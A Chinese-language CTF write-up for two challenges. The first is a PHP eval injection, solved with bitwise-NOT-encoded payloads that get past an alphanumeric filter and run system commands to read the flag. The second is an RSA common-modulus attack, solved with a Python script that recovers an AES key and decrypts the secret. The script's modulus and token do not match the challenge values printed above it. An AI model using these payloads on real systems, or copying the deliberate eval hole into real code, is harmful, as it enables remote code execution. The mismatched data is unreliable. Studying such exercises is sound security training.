# ez_rce

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$cmd=$_GET['cmd'];
if(preg_match('/[a-z0-9]/i',$cmd)){
    die('hacker');
}
eval($cmd); 
```

代码显示正则会检测数字和大小写字母
先尝试一下取反

```
?cmd=(~%8F%97%8F%96%91%99%90)();
```
发现可以显示窗口，假设flag就在当前目录下，那我们只需要

```
cat flag
```

就可以拿到结果，尝试一下发现是可以的

```
?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);
```

# Mixed encryption

题目提示rsa+AES

按照步骤得到相关数字：
{"n": "140351165930374413500861495212965906995744603497648102022984622325860950378137285762634810379674657123392349060690703850119252785108037183499363422755767909789939306792780111910485327250686920167457001537924571472454478870800613144287653558371699369681617436266058157318593437501162395758655056256986356952867", "e1": 65537, "e2": 17, "token": "JzoF_bd2RLe68Fnq"}
{"cipher1": "P8DT5FvjKVI2dhM8y82+yQ==", "cipher2a": "PNe1z0XH0fki02rN4a6SHO0DoYhWC+v49/6kAPmYJxe3RJ6qIocplDTPxEdoTfjnZXK//jn8pfL0PJHjB9RaFXgg2I3/fkuiy1DsQSsYE5S4YP7lLCkLTW07vLXX2pkIbyWURS/D2WrwepiOCTxApbqQTNeFxxPD9Zr9LIzsGQU=", "cipher2b": "n572USIHmce1Ith5+Ytr59NwyaWc/wHAI72/Dm8cpuUFtXpTrx5tU5b5Udm/jtfNR4eWbbcdFtroKVpwsEsbJBQPJivh1g0eYBV3xGYc61Rhc75Rf9tXPqPfdHE+AV9BaCeXzT8b8F0/9A26MQ6h+FRsXxEDhQmgG+v4jVzk51Q="}

```python
import base64
import hashlib
import hmac
from Crypto.Cipher import AES

def egcd(a, b):
    if b == 0:
        return (a, 1, 0)
    else:
        g, x, y = egcd(b, a % b)
        return (g, y, x - (a // b) * y)

def common_modulus(c1, c2, e1, e2, n):
    g, s1, s2 = egcd(e1, e2)
    assert g == 1, "gcd(e1,e2) != 1"
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    return m

# ========== 题目数据 ==========
n = 139335977482131574969028391932159210806836326903960716131701451781525804394267272601517818220590276762854390824201618781841488554927386574746572538397056825495831283057299091872410841436505458728292258520264012608746028602383342825373927257129402068577333059660883333544138535478830691506463626739099508248259
token = "OWpJzmQqOrl2hJsy"
cipher1_b64 = "BCYikbjAyznAmiY7Uo+t2A=="
c2a_b64 = "Pxd/cNe3WoRX6s+YnurriHqU1D5maAQHqLRxu6TZzTWkMCFtn6FcdrALwdRLYFg1D5BqkJhWU2I0Wa83L7KNEarJPtuch7IwVEksBkTV2629xfssmf+AGKxCx/n7Sm9RtXtiu7m8JZop/x2g3dJs7UAwCXKDirEBR1+ODH1zp38="
c2b_b64 = "cJc6rL5WD4seztzN/R8OiF6F5Ye3rb5TjEHIEgBQPskVGvRbelLoj+aP03b8/W382cR4i8y8UUPRMJ2yWkMB/lfxvyH5JbnBPdoeinFaGIA2hKW+yJACsOIKsn4ay06fv6IjCjXzKmkaewkS/lmRmjchtRBTcPyAIIHrP+3JX/A="
e1 = 65537
e2 = 17
# ==============================

# base64 解码
c2a = int.from_bytes(base64.b64decode(c2a_b64), "big")
c2b = int.from_bytes(base64.b64decode(c2b_b64), "big")
ct1 = base64.b64decode(cipher1_b64)

print(f"[*] n bit length: {n.bit_length()}")
print(f"[*] c2a bit length: {c2a.bit_length()}")
print(f"[*] c2b bit length: {c2b.bit_length()}")

# 共模攻击：c2a = m^e1 mod n, c2b = m^e2 mod n, 解出 m = aes_key
m = common_modulus(c2a, c2b, e1, e2, n)
aes_key = m.to_bytes(16, "big")
print(f"[+] AES KEY (hex): {aes_key.hex()}")
print(f"[+] AES KEY (raw): {aes_key}")

# 验证：重新加密 c2a 和 c2b
verify_c2a = pow(m, e1, n)
verify_c2b = pow(m, e2, n)
assert verify_c2a == c2a, "c2a verification failed!"
assert verify_c2b == c2b, "c2b verification failed!"
print("[+] 共模攻击验证通过：m^e1 mod n == c2a, m^e2 mod n == c2b")

# 计算 CTR nonce = HMAC-SHA256(aes_key, token)[:12]
nonce = hmac.new(aes_key, token.encode(), hashlib.sha256).digest()[:12]
print(f"[+] nonce (hex): {nonce.hex()}")

# AES-CTR 解密 cipher1
cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)
secret = cipher.decrypt(ct1)
print(f"[+] secret (raw bytes): {secret}")
print(f"[+] secret (decoded): {secret.decode()}")

print("\n" + "="*50)
print(f"提交用 JSON: {{\"token\":\"{token}\",\"secret\":\"{secret.decode()}\"}}")
print("="*50)

```

得到结果

```
POST /answer {"token":"JzoF_bd2RLe68Fnq","secret":"XcCNT5ISA148WRFv"}
```